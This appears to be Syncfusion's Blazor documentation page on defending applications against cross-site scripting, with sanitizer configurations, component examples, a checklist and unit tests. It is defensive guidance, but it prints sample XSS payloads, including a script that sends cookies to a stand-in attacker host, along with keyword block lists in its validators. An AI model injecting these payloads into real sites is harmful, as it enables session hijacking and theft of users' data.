---
layout: post
title: Cross-Site Scripting (XSS) Security | Syncfusion Blazor
description: Learn how to protect your Syncfusion Blazor applications from XSS attacks with built-in sanitization, server-side validation, and component-specific security guidance.
platform: Blazor
control: Common
documentation: ug
---

# Cross-Site Scripting (XSS) Security in Blazor Applications

## Overview

Cross-Site Scripting (XSS) is one of the most common and critical web application vulnerabilities. This guide explains how to protect Syncfusion<sup style="font-size:70%">&reg;</sup> Blazor applications from XSS attacks using built-in client-side sanitization, server-side validation and sanitization, Content Security Policy (CSP), and component-specific best practices.

## What is Cross-Site Scripting (XSS)?

XSS allows attackers to inject and execute malicious scripts in a victim’s browser with the same privileges as your app, which can lead to:

- **Session hijacking** - Stealing authentication tokens or cookies
- **Data theft** - Accessing sensitive user information
- **Malware distribution** - Redirecting users to malicious sites
- **UI manipulation** - Defacing application interfaces
- **Credential harvesting** - Capturing user inputs like passwords

### Types of XSS Attacks

1. **Stored XSS** - Malicious scripts stored in databases and rendered to users (highest risk)
2. **Reflected XSS** - Malicious scripts passed through URL parameters or form inputs
3. **DOM-based XSS** - Client-side scripts manipulating the DOM with unsafe data

## Why XSS Matters in Blazor Applications

### Blazor Server vs. Blazor WebAssembly

Both Blazor hosting models present unique XSS considerations:

**Blazor Server:**
- Server-side execution provides centralized validation
- SignalR connections vulnerable to hijacking if XSS occurs
- User session state can be compromised
- Database and backend resources at risk

**Blazor WebAssembly:**
- Runs entirely in browser with full access to DOM
- API tokens and credentials stored client-side
- Limited server-side validation enforcement
- Larger client-side attack surface

### Syncfusion Component Attack Surface

Syncfusion Blazor components that accept or display user content are potential XSS vectors:

- **Rich content editors** - RichTextEditor, BlockEditor, MarkdownEditor
- **Data display** - DataGrid, ListView, TreeView with templates
- **Communication** - Chat UI, AI AssistView
- **Smart components** - Smart Paste Button, Smart TextArea
- **Dialogs and notifications** - Toast, Dialog, Message with HTML content
- **Navigation** - Menu, Toolbar, Accordion with custom HTML

## XSS Threat Model and Attack Vectors

### Common Attack Vectors

1. **User-generated content**
   - Forum posts, comments, chat messages
   - Rich text editor content
   - Profile information and bios

2. **Data from external sources**
   - Third-party API responses
   - Imported files (CSV, Excel, JSON)
   - RSS feeds and webhooks

3. **Template injections**
   - DataGrid column templates
   - ListView item templates
   - Custom rendering functions

4. **Clipboard operations**
   - Paste events in editors
   - Smart Paste features
   - Copy-paste from untrusted sources

5. **Stored malicious data**
   - Database records with HTML/JS
   - Configuration files
   - Cached content

### Example Attack Payloads

```html
<!-- Script injection -->
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>

<!-- Event handler injection -->
<img src="x" onerror="alert('XSS')" />

<!-- SVG-based attack -->
<svg onload="alert('XSS')">

<!-- Data attribute abuse -->
<div data-bind="innerHTML: maliciousContent"></div>

<!-- JavaScript protocol -->
<a href="javascript:void(document.cookie='stolen')">Click here</a>
```

## Defense-in-Depth Principles

Effective XSS prevention requires multiple layers of defense:

### 1. Output Encoding

Render user text as text, not HTML.

```razor
@* Safe - Blazor automatically encodes *@
<p>@userInput</p>

@* UNSAFE - Bypasses encoding; only safe if sanitized *@
<p>@((MarkupString)userInput)</p>
```

### 2. Input Validation

Validate and restrict input at entry points:

```csharp
public class CommentValidator : AbstractValidator<Comment>
{
    public CommentValidator()
    {
        RuleFor(x => x.Content)
            .NotEmpty()
            .MaximumLength(5000)
            .Must(BeValidContent)
            .WithMessage("Comment contains potentially unsafe content");
    }

    private bool BeValidContent(string content)
    {
        // Reject obvious script tags
        return !content.Contains("<script", StringComparison.OrdinalIgnoreCase);
    }
}
```

### 3. HTML Sanitization

Remove or neutralize dangerous HTML.

```csharp
// Server-side sanitization before storing
using Ganss.Xss;

public string SanitizeHtml(string input)
{
    var sanitizer = new HtmlSanitizer();
    sanitizer.AllowedTags.Clear();
    sanitizer.AllowedTags.UnionWith(new[] { "p", "b", "i", "u", "br" });
    return sanitizer.Sanitize(input);
}
```

### 4. Content Security Policy (CSP)

Implement CSP headers to restrict script execution. Refer to the [Content Security Policy documentation](./content-security-policy) for Blazor-specific guidance.

## Syncfusion Built-in HTML Sanitizer

Syncfusion provides the `EnableHtmlSanitizer` property across multiple components to provide client-side XSS protection.

### How EnableHtmlSanitizer Works

When enabled (default: `true`), the sanitizer:

1. Removes `<script>` tags and their content
2. Strips event handler attributes (`onclick`, `onerror`, `onload`, etc.)
3. Removes javascript: and other unsafe protocols
4. Neutralizes potentially dangerous HTML elements
5. Preserves safe formatting tags (`<p>`, `<b>`, `<i>`, `<ul>`, etc.)

### Components Supporting EnableHtmlSanitizer

The following Syncfusion Blazor components support the `EnableHtmlSanitizer` property:

- **Editors:** RichTextEditor, BlockEditor, InPlaceEditor
- **Navigation:** Accordion, Menu, ContextMenu, Toolbar, Tab, TreeView
- **Data:** DataGrid, ListView, PivotTable
- **Layout:** Dialog, DashboardLayout, Splitter
- **Notifications:** Toast
- **Buttons:** Button, CheckBox, RadioButton, DropDownButton, SplitButton, ProgressButton
- **Others:** FileManager, Tooltip, Slider

### Limitations of Client-Side Sanitization

> **Important:** Client-side sanitization alone is `NOT sufficient` for security. `EnableHtmlSanitizer` provides user experience benefits and defense-in-depth, but cannot replace server-side validation.

**Why client-side sanitization is insufficient:**

1. **Bypass potential** - Attackers can disable JavaScript or modify requests
2. **No database protection** - Malicious content can still be stored
3. **API vulnerability** - Direct API calls bypass client-side checks
4. **Zero trust principle** - Never trust client-side validation

Use EnableHtmlSanitizer to:
- Improve user experience by catching accidental HTML
- Add an extra defense layer (defense-in-depth)
- Provide immediate feedback without server round-trip

Do not use it as:
- The sole security mechanism
- A replacement for server-side sanitization

## Server-Side Sanitization (Authoritative)

Server-side sanitization is the **authoritative and required** defense against XSS attacks.

### Recommended Sanitization Libraries

**HtmlSanitizer** (Recommended for .NET)

```
dotnet add package HtmlSanitizer

```

Key features:
- Configurable allow/deny lists
- CSS sanitization
- Active maintenance and security updates

### Server-Side Sanitization Example

```csharp
using Ganss.Xss;

public class ContentService
{
    private readonly HtmlSanitizer _sanitizer;
    private readonly AppDbContext _context;

    public ContentService(AppDbContext context)
    {
        _context = context;
        
        // Configure sanitizer
        _sanitizer = new HtmlSanitizer();
        
        // Allow only safe tags
        _sanitizer.AllowedTags.Clear();
        _sanitizer.AllowedTags.UnionWith(new[] {
            "p", "br", "strong", "em", "u", "ol", "ul", "li",
            "h1", "h2", "h3", "h4", "h5", "h6",
            "blockquote", "a", "img"
        });
        
        // Allow safe attributes
        _sanitizer.AllowedAttributes.Clear();
        _sanitizer.AllowedAttributes.UnionWith(new[] { "href","src","alt","title" });
        
       // Restrict URL schemes (avoid data: unless you trust sources)
        _sanitizer.AllowedSchemes.Clear();
        _sanitizer.AllowedSchemes.UnionWith(new[] { "http","https","mailto" });
    }

    // Sanitize before storing
    public async Task<BlogPost> CreatePostAsync(BlogPost post)
    {
        post.Title = _sanitizer.Sanitize(post.Title);
        post.Content = _sanitizer.Sanitize(post.Content);
        post.Summary = _sanitizer.Sanitize(post.Summary);
        
        _context.BlogPosts.Add(post);
        await _context.SaveChangesAsync();
        
        return post;
    }

    // Sanitize when retrieving (defense-in-depth)
    public async Task<BlogPost> GetPostAsync(int id)
    {
        var post = await _context.BlogPosts.FindAsync(id);
        if (post != null)
        {
            post.Content = _sanitizer.Sanitize(post.Content);
        }
        return post;
    }
}
```

### API Controller Example

```csharp
[ApiController]
[Route("api/[controller]")]
public class CommentsController : ControllerBase
{
    private readonly HtmlSanitizer _sanitizer;
    private readonly CommentRepository _repository;

    public CommentsController(CommentRepository repository)
    {
        _repository = repository;
        _sanitizer = new HtmlSanitizer();
        ConfigureSanitizer();
    }

    [HttpPost]
    public async Task<IActionResult> CreateComment([FromBody] CommentDto dto)
    {
        // Server-side validation
        if (string.IsNullOrWhiteSpace(dto.Content))
        {
            return BadRequest("Content is required");
        }

        // Sanitize before storing
        var comment = new Comment
        {
            Author = _sanitizer.Sanitize(dto.Author),
            Content = _sanitizer.Sanitize(dto.Content),
            CreatedAt = DateTime.UtcNow
        };

        await _repository.AddAsync(comment);
        return Ok(comment);
    }

    private void ConfigureSanitizer()
    {
        _sanitizer.AllowedTags.Clear();
        _sanitizer.AllowedTags.UnionWith(new[] { "p", "br", "b", "i", "u" });
    }
}
```

## Component-Specific Guidance and Examples

### RichTextEditor and BlockEditor

Rich text editors are high-risk and require both client- and server-side protection.

**BlockEditor with EnableHtmlSanitizer:**

```razor
@using Syncfusion.Blazor.BlockEditor;

<div id="container">
    <SfBlockEditor Blocks="@BlocksData" EnableHtmlSanitizer="true"></SfBlockEditor>
</div>
@code {
    private List<BlockModel> BlocksData = new()
    {
        new BlockModel
        {
            BlockType = BlockType.Paragraph,
            Content = new()
            {
                new ContentModel
                {
                    ContentType = ContentType.Text,
                    Content = "Safe content here"
                }
            }
        }
    };
}
```

**RichTextEditor with server-side sanitization on save:**

```razor
@using Syncfusion.Blazor.RichTextEditor
@using System.Net.Http.Json
@inject HttpClient Http

<SfRichTextEditor @bind-Value="@ArticleContent"
                  EnableHtmlSanitizer="true">
    <RichTextEditorToolbarSettings Items="@Tools" />
</SfRichTextEditor>

<button class="e-btn e-primary" @onclick="SaveArticle">Save</button>

@code {
    private string ArticleContent { get; set; } = string.Empty;

    private List<ToolbarItemModel> Tools = new()
    {
        new ToolbarItemModel() { Command = ToolbarCommand.Bold },
        new ToolbarItemModel() { Command = ToolbarCommand.Italic },
        new ToolbarItemModel() { Command = ToolbarCommand.Underline }
    };

    private class SanitizedContent
    {
        public string CleanContent { get; set; } = string.Empty;
    }

    private async Task SaveArticle()
    {
        // Server-side sanitization required
        var response = await Http.PostAsJsonAsync("api/articles/sanitize",
            new { content = ArticleContent });
        if (response.IsSuccessStatusCode)
        {
            var result = await response.Content.ReadFromJsonAsync<SanitizedContent>();
            await StoreInDatabase(result!.CleanContent);
        }
    }

    private Task StoreInDatabase(string cleanHtml) => Task.CompletedTask;
}
```

### DataGrid Templates

Grid templates must render only server-sanitized content.

**UNSAFE - Direct HTML rendering:**

```razor
@* NEVER DO THIS *@
<SfGrid DataSource="@Comments">
    <GridColumns>
        <GridColumn Field="@nameof(Comment.Content)">
            <Template>
                @{
                    var comment = (context as Comment);
                    @((MarkupString)comment.Content) @* UNSAFE! *@
                }
            </Template>
        </GridColumn>
    </GridColumns>
</SfGrid>
```

**SAFE - Sanitized MarkupString:**

```razor
@using Ganss.Xss
@using System.Net.Http.Json
@inject HttpClient Http

<SfGrid DataSource="@Comments">
    <GridColumns>
        <GridColumn Field="@nameof(Comment.Author)" HeaderText="Author" Width="150" />
        <GridColumn HeaderText="Comment" Width="400">
            <Template Context="comment">
                @((MarkupString)comment.SanitizedContent)
            </Template>
        </GridColumn>
        <GridColumn Field="@nameof(Comment.CreatedAt)" HeaderText="Date" Width="150" Format="d" TextAlign="TextAlign.Center" />
    </GridColumns>
</SfGrid>


@code {
    private List<Comment> Comments { get; set; } = new();
    private readonly HtmlSanitizer sanitizer = new HtmlSanitizer();

    protected override async Task OnInitializedAsync()
    {
        var raw = await Http.GetFromJsonAsync<List<Comment>>("api/comments") ?? new();
        // Re-sanitize as defense-in-depth
        Comments = raw.Select(c => new Comment
        {
            Id = c.Id,
            Author = c.Author,
            Content = c.Content,
            SanitizedContent = sanitizer.Sanitize(c.Content),
            CreatedAt = c.CreatedAt
        }).ToList();
    }
}

public class Comment
{
    public int Id { get; set; }
    public string Author { get; set; } = string.Empty;
    public string Content { get; set; } = string.Empty;
    public string SanitizedContent { get; set; } = string.Empty;
    public DateTime CreatedAt { get; set; }
}
```

**Alternative - Text-only rendering:**

```razor
<SfGrid DataSource="@Comments">
    <GridColumns>
        <GridColumn Field="@nameof(Comment.Content)" HeaderText="Comment">
            <Template Context="comment">
                @comment.Content @* Safe - Blazor auto-encodes *@
            </Template>
        </GridColumn>
    </GridColumns>
</SfGrid>
```

### ListView with Custom Templates

Similar principles apply to ListView:

```razor
@using Syncfusion.Blazor.Lists

<SfListView DataSource="@Messages"
            CssClass="e-list-template"
            EnableVirtualization="true">
    <ListViewFieldSettings Text="Content" Id="Id"></ListViewFieldSettings>
    <ListViewTemplates>
        <Template Context="message">
            <div class="message-container">
                <div class="message-header">
                    <strong>@message.Sender</strong>
                    <span class="timestamp">@message.Timestamp.ToShortTimeString()</span>
                </div>
                <div class="message-body">
                    @if (message.IsHtml)
                    {
                        @((MarkupString)message.SanitizedContent)
                    }
                    else
                    {
                        @message.Content @* Plain text - auto-encoded *@
                    }
                </div>
            </div>
        </Template>
    </ListViewTemplates>
</SfListView>

@code {
    private List<ChatMessage> Messages { get; set; } = new();

    public class ChatMessage
    {
        public int Id { get; set; }
        public string Sender { get; set; } = string.Empty;
        public string Content { get; set; } = string.Empty;
        public string SanitizedContent { get; set; } = string.Empty;
        public bool IsHtml { get; set; }
        public DateTime Timestamp { get; set; }
    }
}
```

### Chat UI and Message Components

Chat applications require special attention due to real-time user input:

```razor
@using Syncfusion.Blazor.InteractiveChat
@using Ganss.Xss
@using System.Net.Http.Json
@inject HttpClient Http

<SfChat Messages="@ChatMessages"
        User="@CurrentUser"
        MessageSend="OnMessageSend">
</SfChat>

@code {
    private List<ChatMessage> ChatMessages = new();
    private UserModel CurrentUser = new() { ID = "user1", User = "John Doe" };
    private readonly HtmlSanitizer sanitizer = new HtmlSanitizer();

    private async Task OnMessageSend(ChatMessageSendEventArgs args)
    {
        // Sanitize outgoing user text
        var clean = sanitizer.Sanitize(args.Message.Text);

        var msg = new ChatMessage
        {
            Text = clean,
            Author = CurrentUser,
            Timestamp = DateTime.Now
        };

        // Persist to server (server sanitizes again before store)
        await Http.PostAsJsonAsync("api/chat/messages", msg);

        ChatMessages.Add(msg);
    }

    protected override async Task OnInitializedAsync()
    {
        // Load messages (assumed already sanitized on server)
        ChatMessages = await Http.GetFromJsonAsync<List<ChatMessage>>("api/chat/messages") ?? new();
    }
}
```

### Smart Components (Smart Paste, AI AssistView)

AI-powered components introduce additional risks:

**Smart Paste Button:**

```razor
@using Syncfusion.Blazor.SmartComponents
@using Ganss.Xss

<SfSmartPasteButton Content="Smart Paste"
                    TargetSelector="#description"
                    PasteComplete="OnSmartPasteComplete">
</SfSmartPasteButton>

<SfTextBox @bind-Value="@Description"
           ID="description"
           Multiline="true">
</SfTextBox>

@code {
    private string Description { get; set; } = string.Empty;

    private async Task OnSmartPasteComplete(SmartPasteEventArgs args)
    {
        // Sanitize AI-generated or pasted content
        var sanitizer = new HtmlSanitizer();
        Description = sanitizer.Sanitize(args.PastedContent);

        if (ContainsSuspiciousContent(Description))
        {
            Description = string.Empty;
            await ShowWarning("Pasted content contains potentially unsafe elements");
        }
    }

    private static bool ContainsSuspiciousContent(string content)
    {
        var suspicious = new[] { "<script", "javascript:", "onerror=", "onload=" };
        return suspicious.Any(s => content.Contains(s, StringComparison.OrdinalIgnoreCase));
    }

    private Task ShowWarning(string message) => Task.CompletedTask;
}
```

### AI AssistView

AI-powered components must sanitize both prompts and responses:

```razor
@using Syncfusion.Blazor.InteractiveChat
@using Ganss.Xss

<SfAIAssistView Prompts="@PromptSuggestions"
                PromptRequest="OnPromptRequest">
</SfAIAssistView>

@code {
    private List<AssistViewPrompt> PromptSuggestions { get; set; } = new();
    private readonly HtmlSanitizer sanitizer = new HtmlSanitizer();

    private async Task OnPromptRequest(AssistViewPromptRequestedEventArgs args)
    {
        // Sanitize user prompt
        args.Prompt = sanitizer.Sanitize(args.Prompt);

        // Get AI response (from API/service)
        var aiResponse = await GetAIResponse(args.Prompt);
        
        // Sanitize AI response before displaying
        args.Response = sanitizer.Sanitize(aiResponse);
    }

    private Task<string> GetAIResponse(string prompt)
    {
        // Call AI service
        return Task.FromResult("AI response here");
    }
}
```

**Key Security Points:**
- Sanitize user prompt before processing
- Sanitize AI-generated response before display
- Both client-side and server-side sanitization recommended

### Toast and Dialog with HTML Content

Toast supports client-side sanitization.

```razor
@using Syncfusion.Blazor.Notifications
@using Ganss.Xss

<SfToast @ref="ToastObj"
         EnableHtmlSanitizer="true">
    <ToastPosition X="Right" Y="Top"></ToastPosition>
</SfToast>

@code {
    private SfToast ToastObj = default!;
    private readonly HtmlSanitizer sanitizer = new();

    private async Task ShowNotification(string userMessage)
    {
        // Still sanitize server-side when persisting or receiving from APIs
        var sanitized = sanitizer.Sanitize(userMessage);
        await ToastObj.ShowAsync(new ToastModel
        {
            Content = sanitized,
            CssClass = "e-toast-info"
        });
    }
}
```

**Dialog (HTML content safely rendered):**

```razor
@using Syncfusion.Blazor.Popups
@using System.Net.Http.Json
@inject HttpClient Http

<SfDialog @ref="DialogRef"
          Header="Notice"
          ShowCloseIcon="true"
          IsModal="true"
          Width="400px"
          EnableHtmlSanitizer="true"
          Content="@DialogContent">
</SfDialog>

<button class="e-btn" @onclick="() => OpenDialogAsync(UserProvidedHtml)">Open dialog</button>

@code {
    private SfDialog DialogRef = default!;
    private string DialogContent { get; set; } = string.Empty;

    private async Task OpenDialogAsync(string rawHtml)
    {
        DialogContent = await SanitizeOnServer(rawHtml);
        await DialogRef.ShowAsync();
    }

    private async Task<string> SanitizeOnServer(string content)
    {
        var response = await Http.PostAsJsonAsync("api/sanitize", new { content });
        return await response.Content.ReadAsStringAsync();
    }

    // Example user content
    private string UserProvidedHtml => "<p><b>Hello</b> world</p>";
}
```

## Security Checklist

Use this checklist to ensure comprehensive XSS protection:

### Input Validation
- [ ] Validate all user input on the server side
- [ ] Implement input length limits
- [ ] Use strong typing and data annotations
- [ ] Reject obviously malicious patterns
- [ ] Validate file uploads (type, size, content)

### Output Encoding
- [ ] Use Blazor's default text encoding (`@variable`)
- [ ] Avoid `MarkupString` unless absolutely necessary
- [ ] Encode dynamic attributes and URLs
- [ ] Use parameterized queries for database operations

### HTML Sanitization
- [ ] Enable `EnableHtmlSanitizer` on all applicable components
- [ ] Implement server-side sanitization for all HTML content
- [ ] Use an established sanitization library (HtmlSanitizer)
- [ ] Configure strict allow-lists for tags and attributes
- [ ] Sanitize before storing AND before displaying
- [ ] Re-sanitize content from external sources

### Component Security
- [ ] Review all custom templates in DataGrid, ListView
- [ ] Sanitize RichTextEditor and BlockEditor content
- [ ] Validate Chat UI and AI component inputs/outputs
- [ ] Secure Smart Paste and clipboard operations
- [ ] Sanitize Dialog, Toast, and notification content

### Architecture & Defense-in-Depth
- [ ] Implement Content Security Policy (CSP) headers
- [ ] Use HTTPS everywhere
- [ ] Enable anti-forgery tokens
- [ ] Implement authentication and authorization
- [ ] Log suspicious input patterns
- [ ] Regular security audits and penetration testing
- [ ] Keep Syncfusion packages up to date

### API Security
- [ ] Validate and sanitize in API controllers
- [ ] Use anti-forgery tokens for state-changing operations
- [ ] Implement rate limiting
- [ ] Validate content-type headers
- [ ] Return sanitized responses

## Testing for XSS Vulnerabilities

### Manual Testing

Test with common XSS payloads:

```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
javascript:alert('XSS')
<iframe src="javascript:alert('XSS')">
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
```

### Automated Testing

**Example unit test:**

```csharp
using Xunit;
using Ganss.Xss;

public class SanitizationTests
{
    private readonly HtmlSanitizer _sanitizer;

    public SanitizationTests()
    {
        _sanitizer = new HtmlSanitizer();
        _sanitizer.AllowedTags.Clear();
        _sanitizer.AllowedTags.Add("p");
        _sanitizer.AllowedTags.Add("b");
    }

    [Theory]
    [InlineData("<script>alert('XSS')</script>", "")]
    [InlineData("<img src=x onerror=alert('XSS')>", "")]
    [InlineData("<p>Safe content</p>", "<p>Safe content</p>")]
    [InlineData("<p onclick='alert()'>Text</p>", "<p>Text</p>")]
    public void Sanitizer_RemovesMaliciousContent(string input, string expected)
    {
        var result = _sanitizer.Sanitize(input);
        Assert.Equal(expected, result);
    }

    [Fact]
    public void Sanitizer_PreservesAllowedTags()
    {
        var input = "<p>This is <b>bold</b> text</p>";
        var result = _sanitizer.Sanitize(input);
        Assert.Equal(input, result);
    }

    [Fact]
    public void Sanitizer_RemovesDisallowedTags()
    {
        var input = "<p>Safe</p><script>alert('XSS')</script>";
        var result = _sanitizer.Sanitize(input);
        Assert.Equal("<p>Safe</p>", result);
    }
}
```

### Browser DevTools Testing

1. Open browser developer tools (F12)
2. Monitor console for CSP violations
3. Check Network tab for suspicious requests
4. Verify XSS payloads are neutralized

## Recommended Security Libraries

### .NET Server-Side

| Library | Purpose | Installation |
|---------|---------|--------------|
| [HtmlSanitizer](https://github.com/mganss/HtmlSanitizer) | HTML sanitization | `dotnet add package HtmlSanitizer` |
| [AngleSharp](https://anglesharp.github.io/) | HTML parsing and manipulation | `dotnet add package AngleSharp` |
| [FluentValidation](https://fluentvalidation.net/) | Input validation | `dotnet add package FluentValidation` |

### Client-Side (Blazor WebAssembly)

While server-side sanitization is authoritative, these can provide additional client-side defense:

| Library | Purpose | Installation |
|---------|---------|--------------|
| [DOMPurify](https://github.com/cure53/DOMPurify) | JavaScript HTML sanitization | Via JavaScript interop |
| [js-xss](https://github.com/leizongmin/js-xss) | JavaScript XSS filter | Via JavaScript interop |

### Example: HtmlSanitizer Configuration

```csharp
using Ganss.Xss;

public static class SanitizerConfiguration
{
    public static HtmlSanitizer CreateRestrictiveSanitizer()
    {
        var sanitizer = new HtmlSanitizer();
        
        // Allow only basic formatting
        sanitizer.AllowedTags.Clear();
        sanitizer.AllowedTags.UnionWith(new[] {
            "p", "br", "strong", "em", "u", "ul", "ol", "li"
        });
        
        // No attributes allowed
        sanitizer.AllowedAttributes.Clear();
        
        // No CSS
        sanitizer.AllowedCssProperties.Clear();
        
        // Only safe URI schemes
        sanitizer.AllowedSchemes.Clear();
        sanitizer.AllowedSchemes.Add("http");
        sanitizer.AllowedSchemes.Add("https");
        
        return sanitizer;
    }

    public static HtmlSanitizer CreateEditorSanitizer()
    {
        var sanitizer = new HtmlSanitizer();
        
        // Allow common editor tags
        sanitizer.AllowedTags.Clear();
        sanitizer.AllowedTags.UnionWith(new[] {
            "p", "br", "strong", "em", "u", "s", "ul", "ol", "li",
            "h1", "h2", "h3", "h4", "h5", "h6",
            "blockquote", "a", "img", "table", "thead", "tbody",
            "tr", "th", "td", "pre", "code"
        });
        
        // Allow safe attributes
        sanitizer.AllowedAttributes.Clear();
        sanitizer.AllowedAttributes.Add("href");
        sanitizer.AllowedAttributes.Add("src");
        sanitizer.AllowedAttributes.Add("alt");
        sanitizer.AllowedAttributes.Add("title");
        sanitizer.AllowedAttributes.Add("class");
        
        // Allow safe CSS
        sanitizer.AllowedCssProperties.Clear();
        sanitizer.AllowedCssProperties.UnionWith(new[] {
            "color", "background-color", "font-size", "font-weight",
            "text-align", "margin", "padding"
        });
        
        return sanitizer;
    }
}
```

## Additional Resources

### Syncfusion Documentation
- [Content Security Policy for Blazor](./content-security-policy)
- [Input Validation](./input-validation)

### Security Best Practices
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP HTML Sanitization](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#html-sanitization)
- [Microsoft - Prevent Cross-Site Scripting in ASP.NET Core](https://learn.microsoft.com/en-us/aspnet/core/security/cross-site-scripting)
- [Develop ASP.NET Core Applications Securely](https://www.syncfusion.com/blogs/post/10-practices-secure-asp-net-core-mvc-app.aspx)
- [Shield Your Applications with Content Security Policy](https://www.syncfusion.com/blogs/post/asp-dotnet-mvc-content-security-policy.aspx)

### Tools
- [OWASP ZAP](https://www.zaproxy.org/) - Security testing tool
- [Burp Suite](https://portswigger.net/burp) - Web vulnerability scanner
- [Mozilla Observatory](https://observatory.mozilla.org/) - Security assessment

## Summary

XSS protection in Syncfusion Blazor applications requires a multi-layered approach:

1. **Never trust user input** - Validate and sanitize all data from users, APIs, and external sources
2. **Enable `EnableHtmlSanitizer`** - Use Syncfusion's built-in client-side sanitization for defense-in-depth
3. **Always sanitize server-side** - Use established libraries like HtmlSanitizer for authoritative protection
4. **Use output encoding** - Let Blazor's default encoding protect you; avoid `MarkupString` when possible
5. **Implement CSP** - Add Content Security Policy headers to restrict script execution
6. **Test thoroughly** - Use both manual and automated testing with real XSS payloads
7. **Stay updated** - Keep Syncfusion packages and security libraries current

By following these guidelines and implementing defense-in-depth strategies, you can build secure Blazor applications that protect your users from XSS attacks while maintaining rich, interactive user experiences.

Security is not a one-time task but an ongoing process. Regularly review your code, conduct security audits, and stay informed about emerging threats and best practices.
